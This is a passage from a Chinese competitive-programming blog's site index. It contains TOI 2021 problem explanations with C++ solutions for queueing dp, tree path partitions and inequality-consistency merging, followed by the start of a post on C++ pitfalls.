= [ \u0026#34;; for (int f = 0; L != R; ++L) std::cerr \u0026lt;\u0026lt; (f++ ? \u0026#34;, \u0026#34; : \u0026#34;\u0026#34;) \u0026lt;\u0026lt; *L; std::cerr \u0026lt;\u0026lt; \u0026#34; ]\\033[0m\\n\u0026#34;; } #else #define debug(...) ((void)0) #define safe ((void)0) #define pary(...) ((void)0) #endif // local #define all(v) begin(v),end(v) #define pb emplace_back using namespace std; using ll = long long; using ld = long double; const int inf = 1e9; const ll INF = 1e18; const int maxn = 300; template \u0026lt;typename T, typename U\u0026gt; bool chmin(T \u0026amp;t, const U \u0026amp;u) { return t \u0026lt; u ? false : (t=u, true); } template \u0026lt;typename T, typename U\u0026gt; bool chmax(T \u0026amp;t, const U \u0026amp;u) { return t \u0026gt; u ? false : (t=u, true); } struct Vec { int x, y; void rot(Vec \u0026amp;v) { int nx = v.y * x - v.x * y; int ny = -(v.x * x + v.y * y); x = nx, y = ny; } friend Vec operator-(const Vec \u0026amp;lhs, const Vec \u0026amp;rhs) { return { lhs.x - rhs.x, lhs.y - rhs.y }; } friend istream \u0026amp; operator\u0026gt;\u0026gt;(istream \u0026amp;I, Vec \u0026amp;v) { return I \u0026gt;\u0026gt; v.x \u0026gt;\u0026gt; v.y; } ll norm() const { return 1LL * x * x + 1LL * y * y; } }; using Polygon = vector\u0026lt;Vec\u0026gt;; Vec v[maxn]; Polygon P[maxn]; ld intersection(Vec a, Vec b, int x, int init) { if (a.x \u0026gt; b.x) swap(a, b); if (x \u0026lt; a.x || x \u0026gt; b.x) return init; if (a.x == b.x) return abs(a.y - init) \u0026gt; abs(b.y - init) ? a.y : b.y; return (1LL * a.y * (b.x - x) + 1LL * b.y * (x - a.x)) / ld(b.x - a.x); } pair\u0026lt;ld,ld\u0026gt; calc(Polygon A, Polygon B, Vec v) { if (v.norm() != 0) { for (auto \u0026amp;p: A) p.rot(v); for (auto \u0026amp;p: B) p.rot(v); // fix A, and rotate s.t. B moving down with velocity (0, -1) } vector\u0026lt;int\u0026gt; xs; for (auto p: A) xs.push_back(p.x); for (auto p: B) xs.push_back(p.x); sort(all(xs)), xs.erase(unique(all(xs)), xs.end()); pary(all(xs)); ld lt = inf, rt = -inf; for (int x: xs) { ld la = inf, ra = -inf; ld lb = inf, rb = -inf; for (int i = 0; i \u0026lt; A.size(); i++) { int j = i ? i-1 : A.size() - 1; chmin(la, intersection(A[i], A[j], x, inf)); chmax(ra, intersection(A[i], A[j], x, -inf)); } for (int i = 0; i \u0026lt; B.size(); i++) { int j = i ? i-1 : B.size() - 1; chmin(lb, intersection(B[i], B[j], x, inf)); chmax(rb, intersection(B[i], B[j], x, -inf)); } chmin(lt, lb - ra); chmax(rt, rb - la); } debug(lt, rt); if (lt \u0026gt; rt || rt \u0026lt; 0) return { inf, -inf }; if (v.norm() == 0) return { -inf, inf }; if (lt \u0026lt; 0) lt = 0; lt /= v.norm(), rt /= v.norm(); return { lt, rt }; } signed main() { ios_base::sync_with_stdio(0), cin.tie(0); int n; cin \u0026gt;\u0026gt; n; for (int i = 0; i \u0026lt; n; i++) { cin \u0026gt;\u0026gt; v[i]; int sz; cin \u0026gt;\u0026gt; sz; P[i].resize(sz); for (auto \u0026amp;p: P[i]) cin \u0026gt;\u0026gt; p; } cout \u0026lt;\u0026lt; fixed \u0026lt;\u0026lt; setprecision(10); for (int i = 0; i \u0026lt; n; i++) { vector\u0026lt;pair\u0026lt;ld,int\u0026gt;\u0026gt; evt; for (int j = 0; j \u0026lt; n; j++) { if (i != j) { auto [l, r] = calc(P[i], P[j], v[j] - v[i]); if (l \u0026lt; r) { evt.emplace_back(l, 1); evt.emplace_back(r, -1); } } } sort(all(evt)); int cnt = 0; ld ans = 0; for (int l = 0, r = 0; l \u0026lt; evt.size(); l = r) { for (r = l; r \u0026lt; evt.size(); r++) { if (evt[l].first != evt[r].first) break; cnt += evt[r].second; } if (r == evt.size()) continue; if (cnt) { ans += evt[r].first - evt[l].first; } } if (ans \u0026gt;= inf) cout \u0026lt;\u0026lt; \u0026#34;infinity\\n\u0026#34;; else cout \u0026lt;\u0026lt; ans \u0026lt;\u0026lt; \u0026#39;\\n\u0026#39;; } } p2 line up 題意 現在有一家餐廳，因為防疫關係只能做現點現做的外帶生意，所有等候外帶的顧客必須要在櫃台前排成一排，並且餐廳最多只能容納 $k$ 名顧客排隊，而服務任何一位客人所需要的時間都是 $s$ 單位時間。你已經知道今天有 $n$ 名顧客會出現，第 $i$ 名顧客會在時刻 $t_i$ 時抵達餐廳，而如果成功服務第 $i$ 名顧客，將會帶給餐廳 $p_i$ 的利潤。如果一位顧客加入隊伍時，他是第 $k+1$ 名顧客，那麼他就會打消興致離開，特別注意若此時正好是服務完一位客人之後，那麼他們兩位不算同時出現在隊伍中。請你勸退一些顧客，使得剩下的顧客都能夠順利獲得餐點，請問此時餐廳的最佳收益是多少？\n限制 $1 \\leq k \\leq n \\leq 4000$\n$1 \\leq s \\leq 10^6$\n$1 \\leq t_i \\leq 10^9$\n$1 \\leq p_i \\leq 10^6$\nsubtask 1 (14) $n \\leq 20; s \\leq 1000; t_i \\leq 2000$\nsubtask 2 (9) $k = 1$\nsubtask 3 (24) $n \\leq 100; s \\leq 1000$\nsubtask 4 (53) 無額外限制\n作法 先來喇分XD\nsubtask 1\n$2^n$枚舉要留下哪些顧客，並檢查是否符合題目的條件。可以檢查對題意的理解 subtask 2\n$k = 1$的意思是完全不會有隊伍，所有選的顧客不能有任何一個時刻在等待，也就是說所有有選的$i$，$[t_i,t_i+s)$不能相交。因為帶權所以可能不好greedy，但是可以很容易的dp。 滿分解\n註：以下做菜跟接待都代表服務客人的意思\n考慮最佳解的長相，一定會是一直重複「某位客人來了之後開始做菜，連續為好幾位顧客做菜之後先暫停」。所以我們會想要對於每位客人，枚舉從他來的時間開始接待幾位客人。\n對於一個固定的起始時間和接待人數，首先第一個人會花$s$的時間做菜，在這段時間可能會有一些人到達店裡，在其中又可以選一些人來排隊。隊伍裡面當然是留越多人越好，但是如果人數超過了$k$，很自然的可以貪心的一直把隊伍裡面價值最小的丟掉。在接待完第一個人之後，必須選一個隊伍裡面的客人作為下一位接待的客人，這時候也很自然的會貪心的選隊伍裡面價值最大的來接待，而在接待這個客人的期間又會有一些客人到達，之後不斷重複一樣的原則就能算出最佳利潤。因為會需要刪除隊伍中價值最大跟最小的，賽中筆者是直接用multiset維護隊伍中的客人，也可以用常數可能比較小的兩個heap。\n一輪連續的接待可以更新接待完這些客人之後才來的客人的dp值，因此我們狀態定為$dp_i =$ 在客人$i$來之前做完所有事情所獲得的最大收益，按照$t_i$由小到大就能好好dp。\n要注意題目特別強調的條件，也就是「若此時正好是服務完一位客人之後，那麼他們兩位不算同時出現在隊伍中」，賽中筆者原本一直WA，針對這個敘述修改維護multiset的過程後就AC了（雖然寫的有點醜）。 code 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 #pragma GCC optimize(\u0026#34;Ofast\u0026#34;) #include \u0026lt;bits/stdc++.h\u0026gt; #ifdef local #define safe cerr\u0026lt;\u0026lt;__PRETTY_FUNCTION__\u0026lt;\u0026lt;\u0026#34; line \u0026#34;\u0026lt;\u0026lt;__LINE__\u0026lt;\u0026lt;\u0026#34; safe\\n\u0026#34; #define pary(a...) danb(#a, a) #define debug(a...) qqbx(#a, a) template \u0026lt;typename ...T\u0026gt; void qqbx(const char *s, T ...a) { int cnt = sizeof...(T); ((std::cerr \u0026lt;\u0026lt; \u0026#34;\\033[1;32m(\u0026#34; \u0026lt;\u0026lt; s \u0026lt;\u0026lt; \u0026#34;) = (\u0026#34;) , ... , (std::cerr \u0026lt;\u0026lt; a \u0026lt;\u0026lt; (--cnt ? \u0026#34;, \u0026#34; : \u0026#34;)\\033[0m\\n\u0026#34;))); } template \u0026lt;typename T\u0026gt; void danb(const char *s, T L, T R) { std::cerr \u0026lt;\u0026lt; \u0026#34;\\033[1;32m[ \u0026#34; \u0026lt;\u0026lt; s \u0026lt;\u0026lt; \u0026#34; ] = [ \u0026#34;; for (int f = 0; L != R; ++L) std::cerr \u0026lt;\u0026lt; (f++ ? \u0026#34;, \u0026#34; : \u0026#34;\u0026#34;) \u0026lt;\u0026lt; *L; std::cerr \u0026lt;\u0026lt; \u0026#34; ]\\033[0m\\n\u0026#34;; } #else #define debug(...) ((void)0) #define safe ((void)0) #define pary(...) ((void)0) #endif // local #define all(v) begin(v),end(v) #define pb emplace_back #define get_pos(u,x) int(lower_bound(all(u),x)-begin(u)) using namespace std; using ll = int_fast64_t; using ld = long double; template \u0026lt;typename T\u0026gt; using min_heap = priority_queue\u0026lt;T, vector\u0026lt;T\u0026gt;, greater\u0026lt;T\u0026gt;\u0026gt;; const int mod = 1000000007; const int inf = 1e9; const ll INF = 1e18; const int maxn = 5025; signed main() { ios_base::sync_with_stdio(0), cin.tie(0); int n, k, s; cin \u0026gt;\u0026gt; n \u0026gt;\u0026gt; k \u0026gt;\u0026gt; s; vector\u0026lt;int\u0026gt; t(n), p(n); { vector\u0026lt;pair\u0026lt;int,int\u0026gt;\u0026gt; customer(n); for (auto \u0026amp;[t, p]: customer) cin \u0026gt;\u0026gt; t \u0026gt;\u0026gt; p; sort(all(customer)); for (int i = 0; i \u0026lt; n; i++) tie(t[i], p[i]) = customer[i]; } vector\u0026lt;int\u0026gt; dp(n+1); for (int i = 0; i \u0026lt; n; i++) { dp[i+1] = max(dp[i+1], dp[i]); int profit = p[i]; multiset\u0026lt;int\u0026gt; ms; int j = i+1; for (int x = 1; x \u0026lt;= n; x++) { while (j \u0026lt; n \u0026amp;\u0026amp; t[j] \u0026lt; t[i] + x * s) { ms.insert(p[j++]); while (ms.size() \u0026gt; k-1) ms.erase(ms.begin()); } while (j \u0026lt; n \u0026amp;\u0026amp; t[j] == t[i] + x * s) { ms.insert(p[j++]); while (ms.size() \u0026gt; k) ms.erase(ms.begin()); } dp[j] = max(dp[j], dp[i] + profit); if (ms.empty()) break; profit += *prev(ms.end()); ms.erase(prev(ms.end())); } } cout \u0026lt;\u0026lt; dp[n] \u0026lt;\u0026lt; \u0026#39;\\n\u0026#39;; } p3 earthworm 給定一棵 $n$ 個節點的樹，考慮一種路徑分割（即將樹的邊集分成許多不相交的子集，且每個子集都是一條路徑），定義他的得分是所有路徑的長度的平方和。求所有路徑分割的得分總和，除以 $10^9 + 7$ 的餘數。\n限制 $2 \\leq n \\leq 5000$\nsubtask 1 (13) $n \\leq 12$\nsubtask 2 (19) $n \\leq 100$\nsubtask 3 (7) $n \\leq 5000$，且所有節點的度數不超過 2\nsubtask 4 (9) $n \\leq 5000$，且所有節點的度數不超過 3\nsubtask 5 (52) 無額外限制\n作法 考慮枚舉樹上所有路徑，並計算有幾種路徑分割包含這條路徑。\n從原本的樹上拔掉這條路徑的邊之後可能會剩下一些子樹，因此現在的問題就是如何計算一個樹有幾種路徑分割方法。一開始可能會想要用樹dp來計算，但其實每個頂點可以獨立計算，可以看成是每個頂點有一些相鄰的邊，並且邊可以任意兩兩配對或是不配對的方法數，也就是說一個頂點的貢獻只和他的degree有關。\n事實上一棵樹的路徑分割方法數就是$\\prod_{v\\in V} dp_{\\deg v}$其中$dp_n$是一張$n$個點的完全圖的匹配種類數。\n比較有效率求出$dp_n$的方法是利用遞迴式$dp_n = dp_{n-1} + (n-1)dp_{n-2}$（考慮編號最大的點沒有配/配給某個點），不過筆者賽中的想法是枚舉匹配了幾對再用排列組合計算，式子大概長的像：\n$$\ndp_n = 1 + \\binom{n}{2} + \\frac{\\binom{n}{2}\\binom{n-2}{2}}{2!} + \\frac{\\binom{n}{2}\\binom{n-2}{2}\\binom{n-4}{2}}{3!} + \\cdots\n$$\n枚舉路徑、修改$\\deg$再重新計算種類最naive大概是$\\mathcal{O}(n^3)$，可以過subtask 2並確認式子有沒有推錯。 如果$dp_n$只有前幾項算對也會過subtask 3/4 把每個點當根dfs並沿途維護deg的改變對總方法數的影響可以作到$\\mathcal{O}(n^2)$並在賽中AC這題。 可以用枚舉LCA或是重心剖分等方式來得到更好的複雜度，似乎不是本題想考的。 賽中時限有點緊，可能需要預處理一些東西的反元素，尤其是用排列組合$\\mathcal{O}(n^2)$算$dp_n$的需要注意不要讓$\\log n$跑到$n^2$上，並且要盡量減少mod。 可能會有人想要樹dp直接維護一個子樹的答案，但其實有時候把樹dp的維度弄太複雜反而不好實做也不好想，這個作法是從「每個路徑對答案貢獻多少」出發的。\ncode 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 #pragma GCC optimize(\u0026#34;Ofast\u0026#34;) #include \u0026lt;bits/stdc++.h\u0026gt; #ifdef local #define safe cerr\u0026lt;\u0026lt;__PRETTY_FUNCTION__\u0026lt;\u0026lt;\u0026#34; line \u0026#34;\u0026lt;\u0026lt;__LINE__\u0026lt;\u0026lt;\u0026#34; safe\\n\u0026#34; #define pary(a...) danb(#a, a) #define debug(a...) qqbx(#a, a) template \u0026lt;typename ...T\u0026gt; void qqbx(const char *s, T ...a) { int cnt = sizeof...(T); ((std::cerr \u0026lt;\u0026lt; \u0026#34;\\033[1;32m(\u0026#34; \u0026lt;\u0026lt; s \u0026lt;\u0026lt; \u0026#34;) = (\u0026#34;) , ... , (std::cerr \u0026lt;\u0026lt; a \u0026lt;\u0026lt; (--cnt ? \u0026#34;, \u0026#34; : \u0026#34;)\\033[0m\\n\u0026#34;))); } template \u0026lt;typename T\u0026gt; void danb(const char *s, T L, T R) { std::cerr \u0026lt;\u0026lt; \u0026#34;\\033[1;32m[ \u0026#34; \u0026lt;\u0026lt; s \u0026lt;\u0026lt; \u0026#34; ] = [ \u0026#34;; for (int f = 0; L != R; ++L) std::cerr \u0026lt;\u0026lt; (f++ ? \u0026#34;, \u0026#34; : \u0026#34;\u0026#34;) \u0026lt;\u0026lt; *L; std::cerr \u0026lt;\u0026lt; \u0026#34; ]\\033[0m\\n\u0026#34;; } #else #define debug(...) ((void)0) #define safe ((void)0) #define pary(...) ((void)0) #endif // local #define all(v) begin(v),end(v) #define pb emplace_back #define get_pos(u,x) int(lower_bound(all(u),x)-begin(u)) using namespace std; using ll = int_fast64_t; using ld = long double; template \u0026lt;typename T\u0026gt; using min_heap = priority_queue\u0026lt;T, vector\u0026lt;T\u0026gt;, greater\u0026lt;T\u0026gt;\u0026gt;; const int mod = 1000000007; const int inf = mod; const ll INF = 1e18; const int maxn = 5002; ll dp[maxn], invdp[maxn]; ll modpow(ll e, ll p) { ll r = 1; while (p) (p\u0026amp;1) \u0026amp;\u0026amp; (r=r*e%mod), e=e*e%mod, p\u0026gt;\u0026gt;=1; return r; } vector\u0026lt;int\u0026gt; g[maxn]; int deg[maxn]; ll ans = 0; void dfs(int i, int p, int dep, ll prod) { ans = (ans + 1LL * dep * dep * prod % mod * dp[deg[i]-1] % mod * invdp[deg[i]]) % mod; if (p != -1 \u0026amp;\u0026amp; g[i].size() \u0026gt;= 2) { prod = prod * dp[deg[i]-2] % mod * invdp[deg[i]] % mod; } for (int j: g[i]) { if (j != p) dfs(j, i, dep+1, prod); } } ll fac[maxn], ifac[maxn], inv[maxn]; signed main() { ios_base::sync_with_stdio(0), cin.tie(0); /* dp[0] = 1; dp[1] = 1; for (int i = 2; i \u0026lt; maxn; i++) dp[i] = (dp[i-1] + dp[i-2] * (i-1)) % mod; pary(dp, dp+10); */ inv[1] = 1; for (int i = 2; i \u0026lt; maxn; i++) inv[i] = inv[mod % i] * (mod - mod / i) % mod; fac[0] = ifac[0] = 1; for (int i = 1; i \u0026lt; maxn; i++) { fac[i] = fac[i-1] * i % mod; ifac[i] = ifac[i-1] * inv[i] % mod; } for (int i = 0; i \u0026lt; maxn; i++) { dp[i] = 1; ll prod = 1; for (int j = 0; j * 2 + 2 \\leq i; j++) { ll C = fac[i - j*2] * ifac[2] % mod * ifac[i - j*2 - 2] % mod; prod = prod * C % mod; dp[i] = (dp[i] + prod * ifac[j+1]) % mod; } } pary(dp, dp+10); for (int i = 0; i \u0026lt; maxn; i++) invdp[i] = modpow(dp[i], mod-2); int n; cin \u0026gt;\u0026gt; n; for (int i = 1; i \u0026lt; n; i++) { int a, b; cin \u0026gt;\u0026gt; a \u0026gt;\u0026gt; b; g[a].pb(b); g[b].pb(a); ++deg[a], ++deg[b]; } ll prod = 1; for (int i = 0; i \u0026lt; n; i++) prod = prod * dp[deg[i]] % mod; for (int i = 0; i \u0026lt; n; i++) { debug(i); dfs(i, -1, 0, prod * dp[deg[i]-1] % mod * invdp[deg[i]] % mod); } cout \u0026lt;\u0026lt; ans \u0026lt;\u0026lt; \u0026#39;\\n\u0026#39;; } p4 cards 題意 有 $m$ 張卡片，每張卡片上面會寫著一條形如「$x_i \u0026lt; x_j$」、「$x_i = x_j$」或是「$x_i \u0026gt; x_j$」的敘述，其中 $i$, $j$ 是不大於 $n$ 的正整數。現在要執行 $m - 1$ 次的合併操作，每次會指定兩堆不同的卡片合併成為一堆，在每次的合併操作完，對於兩堆合併而成的那一堆，請輸出是否有一些正整數代進 $x_1, x_2,\\cdots, x_n$ 可以符合該堆所有卡片的敘述。\n限制 $1 \\leq n \\leq 10^5$\n$1 \\leq m \\leq 5 \\times 10^5$\nsubtask 1 (12) $m \\leq 10^5, n \\leq 50$\nsubtask 2 (31) $m \\leq 10^5, n \\leq 1000$\nsubtask 3 (57) 無額外限制\n作法 註：作法 by ericxiao\n先考慮暴力做，就是每次合併完之後判斷這些敘述是否有可能同時達成。要怎麼判斷一堆敘述是否有可能同時達成呢？我們可以把每一個變數($x_1,x_2,\u0026hellip;$)想成一個節點，並把敘述當成他們之間的邊。先把「$x_i = x_j$」的情形處理掉好了，我們把所有相等敘述的兩個變數之間連邊，就可以透過DFS或是DSU，讓我們在之後的敘述遇到某個變數時，就用與它相等的編號最小的變數代替。那接下來就只需要處理「$x_i \u0026gt; x_j$」的敘述了(我們可以把小於敘述的兩邊倒過來)。我們這次一樣把變數當作節點，而對於敘述「$x_i \u0026gt; x_j$」，我們就從$x_i$往$x_j$連一條有向邊。可以發現這些敘述可以同時達成若且唯若這張圖上沒有環。這樣做一次的複雜度是$O(|S|)$，其中$S$代表前要判斷合法性的敘述的集合。所以最糟的清況總複雜度會是$O(m^2)$。雖然稍微優化一下可能可以過subtask 1，但還是有點慢。\n我認為如果可以的話，有時候把題目轉換成更具體的形式後有機會變得比較容易思考。這題的話可以把合併的過程想像成一顆有根的二元樹，其中的$m$個葉子各代表$m$個敘述的其中之一，而其它節點就代表在合併過程中所出現的敘述的集合，並且若$u$的子節點為$v,w$，表示$u$所代表的集合是$v$代表的集合與$w$代表的集合合併的結果。如此一來，題目便是要求你回答這個樹上的每個非葉節點所代表的集合中的全部敘述是否可能同時達成(以下簡稱這樣的節點是好的，反之則是壞的)。應該可以不難地看出若一個節點是壞的，它所有祖先也都是壞的。\n再回頭看看第一段的做法，一個顯然會讓該作法的時間複雜度退化到$O(m^2)$的狀況就是合併的過程中不斷地把一個個敘述加入一個大集合中；也就是說，代表合併過程的二元樹是一條長長的鏈上面接一堆葉節點。如果我們要讓複雜度變好，一定要想辦法解決這種情形。而頗為自然地，可以發現那條鏈上的節點如果有好有壞的話，一定存在一個分界點，使得它和它的子節點都是好的，而它的祖先都是壞的；所以只要找到那個分界點(或是發現其不存在)就可以知道全部節點的答案。這樣的情形不免讓人想要二分搜。這樣的複雜度是多少呢？每次確認一個節點是好是壞就先DFS找到它底下的所有葉節點，得到所有敘述後再直接用原本的作法，所以複雜度是$O(m)$，而總複雜度就是頗好的$O(m\\log m)$。\n那如果合併的過程只是一般的二元樹呢？一個很單純的想法就是我們一次做完一條鏈，只要所有節點都包含於至少一條鏈中就做完整棵樹了。等等，鏈\u0026hellip;樹\u0026hellip;，樹鏈剖分？真是個自然的想法。所以我們就試著對那棵二元樹做樹鏈剖分，然後每一條重鏈也都會符合「存在一個分界點，使得它和它的子節點都是好的，而它的祖先都是壞的」，我們就一樣用二分搜的方式確定該條鏈上的節點是好是壞。\n接著便是估複雜度的時候了！對於一條重鏈，我們所需要花的時間上面分析過，其實是$O(B_i\\log B_i)$，其中$B_i$代表第$i$條重鏈頂的子樹大小。所以總複雜度就是$O((\\sum B_i) \\log M)$。那$(\\sum B_i)$是多少呢？所有重鏈頂的子樹大小的和其是就是根的子樹大小加上所有「輕小孩」的子樹大小，所以其實是$O(m\\log m)$，那總複雜度就是$O(m \\log^2 m)$囉。雖然沒有到真的很快，但也比原本快上不少了。\n這只是個人大略的想法，一些其他問題，包括「一定要把樹建出來嗎？」、「要怎麼在重鏈上二分搜？」就希望大家可以想想看了？\ncode by Omelet\n過了好一陣子才把 code 補上，於是也講一下跟上面類似但不完全一樣的觀點。\n啟發式合併是小點合併到大點，而我們希望一次合併並計算答案的複雜度跟小點有關，才會得到好的複雜度。因為只會越合併越差，那麼我們乾脆在合併的時候先不要計算答案，而是先把合併的順序記下來，一直到一個點要當小點的時候再一次用二分搜計算答案。仔細想想會發現這樣跟輕重鍊剖分要做的事情差不多，下面的 code 是用這樣的想法生出來的，希望複雜度是對的（還沒測過）\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 164 165 166 167 168 169 170 171 172 173 174 175 176 // An AC a day keeps the doctor away. #pragma GCC optimize(\u0026#34;Ofast\u0026#34;) #include \u0026lt;bits/stdc++.h\u0026gt; #ifdef local #define safe std::cerr\u0026lt;\u0026lt;__PRETTY_FUNCTION__\u0026lt;\u0026lt;\u0026#34; line \u0026#34;\u0026lt;\u0026lt;__LINE__\u0026lt;\u0026lt;\u0026#34; safe\\n\u0026#34; #define debug(args...) qqbx(#args, args) #define orange(args...) danb(#args, args) using std::cerr; template \u0026lt;typename ...T\u0026gt; void qqbx(const char *s, T ...args) { int cnt = sizeof...(T); ((cerr \u0026lt;\u0026lt; \u0026#34;\\e[1;32m(\u0026#34; \u0026lt;\u0026lt; s \u0026lt;\u0026lt; \u0026#34;) = (\u0026#34;), ..., (cerr \u0026lt;\u0026lt; args \u0026lt;\u0026lt; (--cnt ? \u0026#34;, \u0026#34; : \u0026#34;)\\e[0m\\n\u0026#34;))); } template \u0026lt;typename T\u0026gt; void danb(const char *s, T L, T R) { cerr \u0026lt;\u0026lt; \u0026#34;\\e[1;32m[ \u0026#34; \u0026lt;\u0026lt; s \u0026lt;\u0026lt; \u0026#34; ] = [ \u0026#34;; for (int f = 0; L != R; ++L) cerr \u0026lt;\u0026lt; (f++ ? \u0026#34;, \u0026#34; : \u0026#34;\u0026#34;) \u0026lt;\u0026lt; *L; cerr \u0026lt;\u0026lt; \u0026#34; ]\\e[0m\\n\u0026#34;; } #else #define safe ((void)0) #define debug(...) ((void)0) #define orange(...) ((void)0) #endif // local #define all(v) begin(v),end(v) using namespace std; const int maxn = 100025, maxm = 500025; struct Edge { char c; int a, b; Edge () = default; Edge (char c, int a, int b) : c(c), a(a), b(b) {} }; namespace impl { vector\u0026lt;int\u0026gt; uG[maxn]; // undirected vector\u0026lt;int\u0026gt; dG[maxn]; // directed bool vis[maxn]; int ccid[maxn]; void uDfs(int i) { vis[i] = true; for (int j: uG[i]) { if (!vis[j]) { ccid[j] = ccid[i]; uDfs(j); } } } } bool noCycle(const vector\u0026lt;Edge\u0026gt; \u0026amp;es) { using namespace impl; for (auto [c, a, b]: es) for (int x: {a, b}) uG[x].clear(), vis[x] = false; for (auto [c, a, b]: es) if (c == \u0026#39;=\u0026#39;) uG[a].push_back(b), uG[b].push_back(a); int ccid_counter = 0; for (auto [c, a, b]: es) for (int x: {a, b}) if (!vis[x]) { ccid[x] = ccid_counter++; uDfs(x); } vector\u0026lt;int\u0026gt; indeg(ccid_counter); for (int i = 0; i \u0026lt; ccid_counter; i++) dG[i].clear(); debug(\u0026#34;HERE\u0026#34;); for (auto [c, a, b]: es) if (c == \u0026#39;\u0026gt;\u0026#39;) { a = ccid[a]; b = ccid[b]; if (a == b) return false; dG[a].push_back(b), ++indeg[b]; } queue\u0026lt;int\u0026gt; que; for (int i = 0; i \u0026lt; ccid_counter; i++) if (indeg[i] == 0) que.push(i); while (!que.empty()) { int i = que.front(); que.pop(); for (int j: dG[i]) if (--indeg[j] == 0) que.push(j); } for (int i = 0; i \u0026lt; ccid_counter; i++) if (indeg[i] != 0) return false; return true; } namespace dsu { int pa[maxm], sz[maxm]; vector\u0026lt;Edge\u0026gt; edges[maxm]; struct Op { int qid; Edge e; Op (int qid) : qid(qid), e() {} Op (Edge e) : qid(-1), e(e) {} }; vector\u0026lt;Op\u0026gt; ops[maxm]; int ans[maxm]; void init(int n) { for (int i = 0; i \u0026lt; n; i++) pa[i] = i, sz[i] = 1; } int anc(int x) { return x==pa[x] ? x : pa[x]=anc(pa[x]); } void doOps(int x) { debug(\u0026#34;doOps\u0026#34;, x, ops[x].size()); const auto ok = [x](int p) -\u0026gt; bool { vector\u0026lt;Edge\u0026gt; es = edges[x]; for (int i = 0; i \u0026lt; p; i++) if (ops[x][i].qid == -1) es.emplace_back(ops[x][i].e); return noCycle(es); }; int p = 0; for (int s = 1\u0026lt;\u0026lt;20; s; s \u0026gt;\u0026gt;= 1) if (p + s \u0026lt;= ops[x].size() \u0026amp;\u0026amp; ok(p + s)) p += s; for (int i = 0; i \u0026lt; p; i++) if (ops[x][i].qid != -1) ans[ops[x][i].qid] = true; for (auto [qid, e]: ops[x]) if (qid == -1) edges[x].emplace_back(e); } void join(int a, int b, int qid) { a = anc(a), b = anc(b); if (a == b) { ops[a].emplace_back(qid); return; } if (sz[a] \u0026lt; sz[b]) swap(a, b); doOps(b); sz[a] += sz[b]; pa[b] = a; for (const Edge \u0026amp;e: edges[b]) ops[a].emplace_back(e); ops[a].emplace_back(qid); edges[b].clear(); ops[b].clear(); } } signed main() { ios_base::sync_with_stdio(0), cin.tie(0); int n, m; cin \u0026gt;\u0026gt; n \u0026gt;\u0026gt; m; dsu::init(m); for (int i = 0; i \u0026lt; m; i++) { int a, b; char c; cin \u0026gt;\u0026gt; a \u0026gt;\u0026gt; c \u0026gt;\u0026gt; b; --a, --b; if (c == \u0026#39;\u0026lt;\u0026#39;) { c = \u0026#39;\u0026gt;\u0026#39;; swap(a, b); } dsu::edges[i].emplace_back(c, a, b); } for (int i = 1; i \u0026lt; m; i++) { int a, b; cin \u0026gt;\u0026gt; a \u0026gt;\u0026gt; b; --a, --b; dsu::join(a, b, i); } dsu::doOps(dsu::anc(0)); for (int i = 1; i \u0026lt; m; i++) cout \u0026lt;\u0026lt; (dsu::ans[i] ? \u0026#34;Yes\\n\u0026#34; : \u0026#34;No\\n\u0026#34;); } ","permalink":"https://omeletwithoutegg.github.io/2021/09/22/toi-2021-sols/","tags":["experience","TOI","geometry","data-structure","dfs","dp","greedy","tree"],"title":"TOI 2021 Solutions"},{"contents":"這篇是想放一些神奇的C++語法錯誤\n也可能會放基礎的(X\n然後可能會是動態更新\nlambda capture (Update: 2021/1/21)\n這似乎是因為capture到值的時候還沒成功建構func這個變數，所以會出問題\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 #include \u0026lt;iostream\u0026gt; #include \u0026lt;functional\u0026gt; using namespace std; signed main() { function\u0026lt;void(void)\u0026gt; func = [=]() { int x; cin \u0026gt;\u0026gt; x; cout \u0026lt;\u0026lt; \u0026#34;ok \u0026#34; \u0026lt;\u0026lt; x \u0026lt;\u0026lt; \u0026#39;\\n\u0026#39;; if(x) func(); }; func(); } const reference \u0026amp; implicit conversion (Update: 2021/1/21)\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 #include \u0026lt;iostream\u0026gt; using namespace std; struct Data { int x; Data(int val = 0) : x(val) {} int calc() { return x * 2 + 3; } }; istream \u0026amp; operator\u0026gt;\u0026gt;(istream \u0026amp;I, const Data \u0026amp;data) { return I \u0026gt;\u0026gt; data.x; } int main() { Data data; cin \u0026gt;\u0026gt; data; cout \u0026lt;\u0026lt; data.calc() \u0026lt;\u0026lt; \u0026#39;\\n\u0026#39;; } vector\u0026lt;bool\u0026gt; access with auto deduce type (Update: 2021/1/21)\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 #include \u0026lt;iostream\u0026gt; #include \u0026lt;vector\u0026gt; using namespace std; int main() { const int n = 20, m = 20; // n * m grid auto check = [\u0026amp;](int x, int y) { cout \u0026lt;\u0026lt; x*m+y \u0026lt;\u0026lt; \u0026#39;\\n\u0026#39;; vector\u0026lt;bool\u0026gt; ok(n * m); // do some calc return ok[x * m + y]; }; cout \u0026lt;\u0026lt; check(0, 0) \u0026lt;\u0026lt; \u0026#39;\\n\u0026#39;; } abs outside of std (Update: 